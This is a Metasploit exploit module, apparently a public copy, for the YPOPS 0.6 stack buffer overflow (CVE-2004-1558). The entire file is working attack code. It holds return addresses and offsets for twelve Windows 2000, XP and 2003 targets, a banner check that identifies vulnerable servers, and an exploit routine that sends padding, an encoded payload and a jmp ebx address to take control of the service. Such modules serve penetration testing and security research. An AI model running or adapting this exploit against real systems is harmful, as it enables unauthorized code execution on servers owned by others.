##
# $Id: ypops_overflow1.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Smtp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'YPOPS 0.6 Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the YPOPS POP3
				service.

				This is a classic stack buffer overflow for YPOPS version 0.6.
				Possibly Affected version 0.5, 0.4.5.1, 0.4.5. Eip point to
				jmp ebx opcode in ws_32.dll
			},
			'Author'         => [ 'acaro <acaro@jervus.it>' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2004-1558'],
					[ 'OSVDB', '10367'],
					[ 'BID', '11256'],
					[ 'URL', 'http://www.securiteam.com/windowsntfocus/5GP0M2KE0S.html'],
				],
			'Platform'       => 'win',
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1200,
					'BadChars' => "\x00\x25",
					'MinNops'  => 106,
				},
			'Targets'        =>
				[
					[ 'Windows 2000 SP0 Italian',   { 'Ret' => 0x74fe6113, 'Offset' => 503 }, ],
					[ 'Windows 2000 Advanced Server Italian SP4', { 'Ret' => 0x74fe16e2, 'Offset' => 503 }, ],
					[ 'Windows 2000 Advanced Server SP3 English', { 'Ret' => 0x74fe22f3, 'Offset' => 503 }, ],
					[ 'Windows 2000 SP0 English',   { 'Ret' => 0x75036113, 'Offset' => 503 }, ],
					[ 'Windows 2000 SP1 English',   { 'Ret' => 0x750317b2, 'Offset' => 503 }, ],
					[ 'Windows 2000 SP2 English',   { 'Ret' => 0x7503435b, 'Offset' => 503 }, ],
					[ 'Windows 2000 SP3 English',   { 'Ret' => 0x750322f3, 'Offset' => 503 }, ],
					[ 'Windows 2000 SP4 English',   { 'Ret' => 0x750316e2, 'Offset' => 503 }, ],
					[ 'Windows XP SP0-SP1 English', { 'Ret' => 0x71ab1636, 'Offset' => 503 }, ],
					[ 'Windows XP SP2 English',     { 'Ret' => 0x71ab773b, 'Offset' => 503 }, ],
					[ 'Windows 2003 SP0 English',   { 'Ret' => 0x71c04202, 'Offset' => 503 }, ],
					[ 'Windows 2003 SP1 English',   { 'Ret' => 0x71c05fb0, 'Offset' => 503 }, ],
				],
			'DisclosureDate' => 'Sep 27 2004'))
	end

	def check
		connect
		disconnect

		banner.gsub!(/\n/, '')

		if banner =~ /YahooPOPs! Simple Mail Transfer Service Ready/
			print_status("Vulnerable SMTP server: #{banner}")
			return Exploit::CheckCode::Detected
		end

		print_status("Unknown SMTP server: #{banner}")
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		pattern =
			rand_text_alpha(target['Offset'] - payload.encoded.length) +
			payload.encoded +
			[target.ret].pack('V') +
			"\n"

		print_status("Trying #{target.name} using jmp ebx at #{"0x%.8x" % target.ret}")

		sock.put(pattern)

		handler
		disconnect
	end

end
